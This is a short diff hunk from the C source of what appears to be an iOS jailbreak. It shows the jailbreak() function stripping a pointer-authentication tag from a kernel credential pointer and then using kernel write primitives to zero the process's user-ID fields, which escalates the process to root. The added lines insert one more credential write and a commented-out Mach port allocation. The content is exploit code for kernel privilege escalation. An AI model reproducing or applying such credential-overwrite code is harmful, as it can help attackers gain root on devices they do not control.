@@ -115,7 +115,26 @@ int jailbreak(void *init) {
     uint64_t ucred = ucred_pac | 0xffffff8000000000;
     printf("UCRED:\t\t0x%llx\t--->\t0x%llx\n", ucred_pac, ucred);
     
+    
+
+    
+    
     uint32_t buffer[5] = {0, 0, 0, 1, 0};
+    
+    write_20(ucred + 0x18, (void*)buffer);
+    //Initialize a Port
+//        mach_port_t port = MACH_PORT_NULL;
+//        kern_return_t err;
+//        //Allocate the port and get a receive right
+//        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+//        if (err != KERN_SUCCESS) {
+//            printf("Failed to Allocate a port \n");
+//            return MACH_PORT_NULL;
+//        }
+//     
+//    printf("New Port:\t0x%llx\n", (uint64_t)port);
+//    printf("PID:\t\t%d\n", getpid());
+    
     uint64_t old_uid = read_64(ucred + off_ucred_cr_uid);
     write_20(ucred + off_ucred_cr_uid, (void*)buffer);
     write_20(ucred + off_p_uid, (void*)buffer);
